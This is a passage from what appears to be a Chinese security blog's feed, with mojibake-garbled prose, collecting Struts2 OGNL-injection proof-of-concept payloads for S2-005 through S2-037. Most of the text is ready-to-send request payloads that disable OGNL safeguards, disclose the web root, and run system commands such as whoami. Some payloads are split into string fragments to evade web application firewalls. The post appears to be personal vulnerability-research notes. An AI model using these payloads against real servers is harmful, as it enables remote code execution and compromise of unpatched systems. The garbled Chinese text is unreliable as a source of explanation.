title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-005"><a href="#Struts2-S2-005" class="headerlink" title="Struts2 S2-005"></a>Struts2 S2-005</h2><pre><code>å½±å“ç‰ˆæœ¬: 2.0.0 - 2.1.8.1æ¼æ´è¯¦æƒ…: http://struts.apache.org/docs/s2-005.html</code></pre><blockquote><p>struts2æ¼æ´çš„èµ·æºæºäºS2-003(å—å½±å“ç‰ˆæœ¬: ä½äºStruts 2.0.12)ï¼Œstruts2ä¼šå°†httpçš„æ¯ä¸ªå‚æ•°åè§£æä¸ºonglè¯­å¥æ‰§è¡Œ(å¯ç†è§£ä¸ºjavaä»£ç )ã€‚onglè¡¨è¾¾å¼é€šè¿‡#æ¥è®¿é—®strutsçš„å¯¹è±¡ï¼Œstrutsæ¡†æ¶é€šè¿‡è¿‡æ»¤#å­—ç¬¦é˜²æ­¢å®‰å…¨é—®é¢˜ï¼Œç„¶è€Œé€šè¿‡unicodeç¼–ç (\u0023)æˆ–8è¿›åˆ¶(\43)å³ç»•è¿‡äº†å®‰å…¨é™åˆ¶ï¼Œå¯¹äºS2-003æ¼æ´ï¼Œå®˜æ–¹é€šè¿‡å¢åŠ å®‰å…¨é…ç½®(ç¦æ­¢é™æ€æ–¹æ³•è°ƒç”¨å’Œç±»æ–¹æ³•æ‰§è¡Œç­‰)æ¥ä¿®è¡¥ï¼Œä½†æ˜¯å®‰å…¨é…ç½®è¢«ç»•è¿‡å†æ¬¡å¯¼è‡´äº†æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨OGNLè¡¨è¾¾å¼è®²è¿™2ä¸ªé€‰é¡¹æ‰“å¼€ï¼ŒS2-003çš„ä¿®è¡¥æ–¹æ¡ˆæŠŠè‡ªå·±ä¸Šäº†ä¸€ä¸ªé”ï¼Œä½†æ˜¯æŠŠé”é’¥åŒ™ç»™æ’åœ¨äº†é”å¤´ä¸Š</p></blockquote><p>ä¸Šæ–‡å¼•ç”¨<a href="http://www.cnblogs.com/LittleHann/p/4606891.html" target="_blank" rel="noopener">LittleHann</a>çš„æè¿°</p><h3 id="æ„é€ PoC-1"><a href="#æ„é€ PoC-1" class="headerlink" title="æ„é€ PoC"></a>æ„é€ PoC</h3><h4 id="è·å–webæ ¹ç›®å½•-1"><a href="#è·å–webæ ¹ç›®å½•-1" class="headerlink" title="è·å–webæ ¹ç›®å½•"></a>è·å–webæ ¹ç›®å½•</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&apos;\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\43context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\75false&apos;)(b))&amp;(&apos;\43c&apos;)((&apos;\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\43req\75@org.apache.struts2.ServletActionContext@getRequest()&apos;)(d))&amp;(i2)((&apos;\43xman\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(i97)((&apos;\43xman.getWriter().println(\43req.getRealPath(%22\u005c%22))&apos;)(d))&amp;(i99)((&apos;\43xman.getWriter().close()&apos;)(d))</span><br></pre></td></tr></table></figure><h4 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤-1"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤-1" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&apos;\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\43context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\75false&apos;)(b))&amp;(&apos;\43c&apos;)((&apos;\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\43mycmd\75\&apos;&quot;+cmd+&quot;\&apos;&apos;)(d))&amp;(h)((&apos;\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)&apos;)(d))&amp;(i)((&apos;\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())&apos;)(d))&amp;(j)((&apos;\43myres\75new\40byte[51020]&apos;)(d))&amp;(k)((&apos;\43mydat.readFully(\43myres)&apos;)(d))&amp;(l)((&apos;\43mystr\75new\40java.lang.String(\43myres)&apos;)(d))&amp;(m)((&apos;\43myout\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(n)((&apos;\43myout.getWriter().println(\43mystr)&apos;)(d))</span><br></pre></td></tr></table></figure><p>ä¸Šé¢2ä¸ªPoCæ‘˜è‡ªk8teamï¼Œä¸ºäº†å†™PoCï¼Œæœ‰æ‰€æ”¹åŠ¨ï¼Œä½†æ˜¯è¿™é‡Œå°±ä¸è´´ä¸Šæ¥äº†ï¼šï¼‰</p><h2 id="Struts2-S2-009"><a href="#Struts2-S2-009" class="headerlink" title="Struts2 S2-009"></a>Struts2 S2-009</h2><pre><code>å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.1.1æ¼æ´è¯¦æƒ…: https://struts.apache.org/docs/s2-009.html</code></pre><p>æ¼æ´åˆ©ç”¨ç‚¹è·ŸS2-003å’ŒS2-005ç±»ä¼¼ï¼Œåˆ©ç”¨OGNLè¡¨è¾¾å¼(1)(2),ä¼šæ‰§è¡Œ1çš„OGNLè¡¨è¾¾å¼ï¼Œ009æ„é€ äº†çš„æ–¹æ³•ä¸ºtest=(some OGNL è¡¨è¾¾å¼)(1)&amp;z[(test)(1)]=trueã€‚<br>z[(test)(1)]=true,å¯¹struts2æ¥è¯´æ˜¯åˆæ³•çš„å‚æ•°ï¼Œä½†æ˜¯(test)(1)ä¼šæ‰§è¡Œä¸Šè¿°è¯´çš„æ–¹æ³•ï¼Œtestçš„å€¼è¢«å¸¦å…¥è®¡ç®—ï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œã€‚</p><h3 id="æ„é€ PoC-2"><a href="#æ„é€ PoC-2" class="headerlink" title="æ„é€ PoC"></a>æ„é€ PoC</h3><h4 id="å¼¹è®¡ç®—å™¨"><a href="#å¼¹è®¡ç®—å™¨" class="headerlink" title="å¼¹è®¡ç®—å™¨"></a>å¼¹è®¡ç®—å™¨</h4><p>ps:å®éªŒç¯å¢ƒè¯•äº†å¥½å‡ æ¬¡éƒ½ä¸èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè·¯è¿‡çš„å¤§ä½¬æ±‚æŒ‡æ•™ï¼šï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person.name=(#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]= new java.lang.Boolean(false), #_memberAccess[&quot;allowStaticMethodAccess&quot;]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec(&apos;open /Applications/Calculator.app&apos;))(meh)&amp;z[(person.name)(&apos;meh&apos;)]=true</span><br></pre></td></tr></table></figure><p>ç”¨çš„æ˜¯<code>person/new-person.action</code>è¿™ä¸ªæ§åˆ¶å™¨</p><h4 id="è·å–webæ ¹ç›®å½•-2"><a href="#è·å–webæ ¹ç›®å½•-2" class="headerlink" title="è·å–webæ ¹ç›®å½•"></a>è·å–webæ ¹ç›®å½•</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person.name=%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%20new%20java.lang.Boolean%28false%29%2C%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D@org.apache.struts2.ServletActionContext@getRequest%28%29%2C%23outstr%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23outstr.println%28%27webpath%3A%27%2b%23req.getRealPath%28%22%2f%22%29%29%2C%23outstr.close%28%29%29%28meh%29&amp;z%5B%28person.name%29%28%27meh%27%29%5D&quot;</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-012"><a href="#Struts2-S2-012" class="headerlink" title="Struts2 S2-012"></a>Struts2 S2-012</h2><pre><code>å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.13æ¼æ´è¯¦æƒ…: https://cwiki.apache.org/confluence/display/WW/S2-012</code></pre><p>Action ä¸­ Result æ—¶ä½¿ç”¨äº†é‡å®šå‘ç±»å‹ï¼Œå¹¶ä¸”è¿˜ä½¿ç”¨ ${param_name} ä½œä¸ºé‡å®šå‘å˜é‡,strutsåœ¨è·å–å…¶å€¼æ—¶ä¼šæ‰§è¡ŒOGNLè¡¨è¾¾å¼ï¼Œä»è€Œé€ æˆå‘½ä»¤æ‰§è¡Œ</p><h3 id="æ„é€ PoC-3"><a href="#æ„é€ PoC-3" class="headerlink" title="æ„é€ PoC"></a>æ„é€ PoC</h3><h4 id="è·å–webæ ¹è·¯å¾„"><a href="#è·å–webæ ¹è·¯å¾„" class="headerlink" title="è·å–webæ ¹è·¯å¾„"></a>è·å–webæ ¹è·¯å¾„</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23response%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23response.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23response.flush%28%29%2C%23response.close%28%29%29%7D</span><br></pre></td></tr></table></figure><h4 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤-2"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤-2" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%29%7D%0A%0A</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-013-S2-014"><a href="#Struts2-S2-013-S2-014" class="headerlink" title="Struts2 S2-013/S2-014"></a>Struts2 S2-013/S2-014</h2><pre><code>å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.14.1æ¼æ´è¯¦æƒ…: https://cwiki.apache.org/confluence/display/WW/S2-013,https://cwiki.apache.org/confluence/display/WW/S2-014</code></pre><p>æ ‡ç­¾<code>s:url</code>å’Œ<code>s:a</code>ä¸­æä¾›includeå‚æ•°ï¼Œå…¶å‚æ•°å€¼å¯ä»¥ä¸º</p><ol><li>none - include no parameters in the URL (default)</li><li>get - include only GET parameters in the URL</li><li>all - include both GET and POST parameters in the URL</li></ol><p>å¦‚æœå‚æ•°å€¼ä¸ºgetæˆ–allï¼Œåœ¨è·å–å¯¹åº”çš„å‚æ•°å€¼æ—¶æ‰§è¡Œäº†OGNLè¡¨è¾¾å¼</p><h3 id="æ„é€ PoC-4"><a href="#æ„é€ PoC-4" class="headerlink" title="æ„é€ PoC"></a>æ„é€ PoC</h3><h4 id="è·å–webæ ¹ç›®å½•-3"><a href="#è·å–webæ ¹ç›®å½•-3" class="headerlink" title="è·å–webæ ¹ç›®å½•"></a>è·å–webæ ¹ç›®å½•</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;webpath%3a&apos;%2b%23req.getRealPath(&quot;/&quot;)),%23out.close())&#125;</span><br></pre></td></tr></table></figure><h4 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤-3"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤-3" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23a=@java.lang.Runtime@getRuntime().exec(&apos;&quot;+cmd+&quot;&apos;).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;dbapp%3a&apos;%2bnew java.lang.String(%23d)),%23out.close())&#125;</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-016"><a href="#Struts2-S2-016" class="headerlink" title="Struts2 S2-016"></a>Struts2 S2-016</h2><pre><code>å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.15æ¼æ´è¯¦æƒ…: https://struts.apache.org/docs/s2-016.html</code></pre><blockquote><p>DefaultActionMapper ç±»æ”¯æŒä»¥ action:ï¼Œredirect: å’Œ redirectAction: ä½œä¸ºè®¿é—®å‰ç¼€ï¼Œå‰ç¼€åé¢å¯ä»¥è·Ÿ OGNL è¡¨è¾¾å¼ï¼Œç”±äº Struts2 æœªå¯¹å…¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´ä»»æ„ Action å¯ä»¥ä½¿ç”¨è¿™äº›å‰ç¼€æ‰§è¡Œä»»æ„ OGNL è¡¨è¾¾å¼ï¼Œä»è€Œå¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œ</p></blockquote><p>ä¸Šæ–‡å¼•ç”¨<a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">rickgray</a>çš„æè¿°ã€‚</p><h3 id="æ„é€ PoC-5"><a href="#æ„é€ PoC-5" class="headerlink" title="æ„é€ PoC"></a>æ„é€ PoC</h3><h4 id="è·å–webæ ¹ç›®å½•-4"><a href="#è·å–webæ ¹ç›®å½•-4" class="headerlink" title="è·å–webæ ¹ç›®å½•"></a>è·å–webæ ¹ç›®å½•</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect:$&#123;#req=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletReq&apos;+&apos;uest&apos;),#resp=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletRes&apos;+&apos;ponse&apos;),#resp.setCharacterEncoding(&apos;UTF-8&apos;),#ot=#resp.getWriter (),#ot.print(&apos;web&apos;),#ot.print(&apos;path:&apos;),#ot.print(#req.getSession().getServletContext().getRealPath(&apos;/&apos;)),#ot.flush(),#ot.close()&#125;</span><br></pre></td></tr></table></figure><h4 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤-4"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤-4" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect:$&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&apos;whoami&apos;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&apos;co&apos;+&apos;m.ope&apos;+&apos;nsymph&apos;+&apos;ony.x&apos;+&apos;wor&apos;+&apos;k2.disp&apos;+&apos;atch&apos;+&apos;er.HttpSe&apos;+&apos;rvletRe&apos;+&apos;sponse&apos;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125;&apos;</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç§æ¯”è¾ƒéšè”½çš„æ–¹æ³•ï¼Œå°†PoCæ”¾åœ¨æ–‡ä»¶ä¸Šä¼ çš„nameå¤„ï¼Œè¿‡wafã€‚</p><h2 id="Struts2-S2-019"><a href="#Struts2-S2-019" class="headerlink" title="Struts2 S2-019"></a>Struts2 S2-019</h2><pre><code>å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.15.1æ¼æ´è¯¦æƒ…: https://cwiki.apache.org/confluence/display/WW/S2-019</code></pre><p>è¯¥æ¼æ´æˆå› ä¸ºå¼€å¯äº†å¼€å‘è€…æ¨¡å¼ï¼Œä¼ å…¥<code>debug=command&amp;expression=</code>å¯¼è‡´æ‰§è¡ŒOGNLè¡¨è¾¾å¼ï¼Œä»è€Œé€ æˆå‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><h3 id="æ„é€ PoC-6"><a href="#æ„é€ PoC-6" class="headerlink" title="æ„é€ PoC"></a>æ„é€ PoC</h3><h4 id="è·å–webæ ¹è·¯å¾„-1"><a href="#è·å–webæ ¹è·¯å¾„-1" class="headerlink" title="è·å–webæ ¹è·¯å¾„"></a>è·å–webæ ¹è·¯å¾„</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=command&amp;expression=%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23resp.setCharacterEncoding%28%27UTF-8%27%29%2C%23resp.getWriter%28%29.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29</span><br></pre></td></tr></table></figure><h4 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤-5"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤-5" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=command&amp;expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-032"><a href="#Struts2-S2-032" class="headerlink" title="Struts2 S2-032"></a>Struts2 S2-032</h2><pre><code>å½±å“ç‰ˆæœ¬: 2.3.20 - 2.3.28 (except 2.3.20.3 and 2.3.24.3)æ¼æ´è¯¦æƒ…: https://struts.apache.org/docs/s2-032.html</code></pre><blockquote><p>åœ¨é…ç½®äº† Struts2 DMI ä¸º True çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ method:<name> Action å‰ç¼€å»è°ƒç”¨å£°æ˜ä¸º public çš„å‡½æ•°ï¼ŒDMI çš„ç›¸å…³ä½¿ç”¨æ–¹æ³•å¯å‚è€ƒå®˜æ–¹ä»‹ç»ï¼ˆDynamic Method Invocationï¼‰ï¼Œè¿™ä¸ª DMI çš„è°ƒç”¨ç‰¹æ€§å…¶å®ä¸€ç›´å­˜åœ¨ï¼Œåªä¸è¿‡åœ¨ä½ç‰ˆæœ¬ä¸­ Strtus2 ä¸ä¼šå¯¹ name æ–¹æ³•å€¼åš OGNL è®¡ç®—ï¼Œè€Œåœ¨é«˜ç‰ˆæœ¬ä¸­ä¼šï¼Œä»£ç è¯¦æƒ…å¯å‚è€ƒé˜¿å°”æ³•å®éªŒå®¤çš„æŠ¥å‘Š - ã€ŠApache Struts2 s2-032æŠ€æœ¯åˆ†æåŠæ¼æ´æ£€æµ‹è„šæœ¬ã€‹</name></p></blockquote><p>ä¸Šæ–‡å¼•ç”¨<a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">rickgray</a>çš„æè¿°ã€‚</p><h3 id="æ„é€ PoC-7"><a href="#æ„é€ PoC-7" class="headerlink" title="æ„é€ PoC"></a>æ„é€ PoC</h3><h4 id="è·å–webæ ¹ç›®å½•-5"><a href="#è·å–webæ ¹ç›®å½•-5" class="headerlink" title="è·å–webæ ¹ç›®å½•"></a>è·å–webæ ¹ç›®å½•</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath:</span><br></pre></td></tr></table></figure><h4 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤-6"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤-6" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag:</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-037"><a href="#Struts2-S2-037" class="headerlink" title="Struts2 S2-037"></a>Struts2 S2-037</h2><pre><code>å½±å“ç‰ˆæœ¬: 2.3.20 - 2.3.28.1æ¼æ´è¯¦æƒ…: http://struts.apache.org/docs/s2-037.html</code></pre><blockquote><p>è¿™ä¸ªæ¼æ´å’Œä¹‹å‰S2-032/033æ˜¯ä¸€ä¸ªåœ°æ–¹ï¼Œéƒ½æ˜¯åœ¨DefaultActionInvocation.javaçš„invokeActionæ–¹æ³•ä¸­æ²¡æœ‰å¯¹äºmethodNameå‚æ•°å†…å®¹è¿›è¡Œæ ¡éªŒï¼Œä¾¿ç›´æ¥ä¸¢åˆ°äº†getValueæ–¹æ³•é‡Œé¢ï¼Œä»è€Œé€ æˆOnglè¡¨è¾¾å¼çš„æ³¨å…¥ã€‚</p></blockquote><p>ä¸Šæ–‡å¼•ç”¨<a href="http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438" target="_blank" rel="noopener">nsfocus</a>%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html)çš„æè¿°</p><h3 id="æ„é€ PoC-8"><a href="#æ„é€ PoC-8" class="headerlink" title="æ„é€ PoC"></a>æ„é€ PoC</h3><h4 id="è·å–webæ ¹ç›®å½•-6"><a href="#è·å–webæ ¹ç›®å½•-6" class="headerlink" title="è·å–webæ ¹ç›®å½•"></a>è·å–webæ ¹ç›®å½•</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close):xx.toString.json?&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath:</span><br></pre></td></tr></table></figure><h4 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤-7"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤-7" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()):xx.toString.json?&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag:</span><br></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>Struts2å‘½ä»¤æ‰§è¡Œç®—æ˜¯ä¸€ä¸ªæ¯”è¾ƒç»å…¸çš„æ¼æ´äº†ï¼Œå¸Œæœ›ä»¥åæ·±å…¥javaçš„ä¸€äº›æ¡†æ¶ï¼Œå¯ä»¥ä»åº•å±‚æ¥åˆ†æï¼šï¼‰</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h1&gt;&lt;p&gt;æœ€è¿‘åœ¨å†™Struts2çš„ä¸€äº›PoCï¼Œè®°å½•ä¸€ä¸‹å„ä¸ªç‰ˆæœ¬çš„PoCæ–¹ä¾¿åˆ°æ—¶å€™æŸ¥é˜…ã€‚å…ˆæä¸€ä¸‹å‚è€ƒçš„å‰è¾ˆä»¬çš„ç½‘å€ï¼Œæ„Ÿè°¢ğŸ™&lt;/p&gt;
    
    </summary>
    
      <category term="notes" scheme="http://blog.0kami.cn/categories/notes/"/>
    
    
      <category term="vul" scheme="http://blog.0kami.cn/tags/vul/"/>
    
  </entry>
  
  <entry>
    <title>ã€Code Reviewã€‘bluecms v1.6 Sql Injection åˆ†æ</title>
    <link href="http://blog.0kami.cn/2017/01/11/old-bluecms-v1-6-Sql-Injection/"/>
    <id>http://blog.0kami.cn/2017/01/11/old-bluecms-v1-6-Sql-Injection/</id>
    <published>2017-01-11T14:02:11.000Z</published>
    <updated>2018-01-25T07:14:44.000Z</updated>
    
